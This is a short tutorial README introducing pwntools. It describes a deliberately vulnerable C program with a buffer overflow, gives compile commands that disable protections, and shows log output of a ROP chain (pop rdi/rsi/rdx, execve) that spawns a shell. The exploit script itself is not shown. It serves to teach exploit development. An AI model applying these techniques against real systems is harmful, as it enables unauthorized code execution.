# pwnlib basics

This should introduce you to the basics of pwnlib. Right now this is just a
simple c program with a buffer overflow vulnerability. It does not currently
work with stack canaries so if it fails try compiling with
`-fno-stack-protector`. The python file, `test.py` uses pwnlib to find gadgets
in the vulnerable binary and then construct them into a stack in order to pop a
shell.

### Install pwntools

```
pip install --upgrade git+https://github.com/Gallopsled/pwntools.git
```
> I like to add `--user`, no need to install as root anyway, just make sure
> `~/.local/bin` is in your path.

### Compile the binary and exploit

```bash
# Compile staticly so that we have more gadgets with a larger program there
# would be enough but this is just an example
gcc main.c -static -o main

# Run the exploit generator and exploit
python test.py
```

You should see this

```log
$ python test.py
[*] '/home/pdxjohnny/Documents/python/pwn/main'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[*] Loaded cached gadgets for './main'
0x0000:         0x4013ce pop rdi; ret
0x0008:         0x4875e8
0x0010:         0x4014e7 pop rsi; ret
0x0018:              0x0
0x0020:         0x433e45 pop rdx; ret
0x0028:              0x0
0x0030:         0x4319e0 execve
0x0038:       'oaaapaaa' <pad>
[+] Starting local process '/home/pdxjohnny/Documents/python/pwn/main': Done
Hello from sh

[*] Process '/home/pdxjohnny/Documents/python/pwn/main' stopped with exit code 0
```
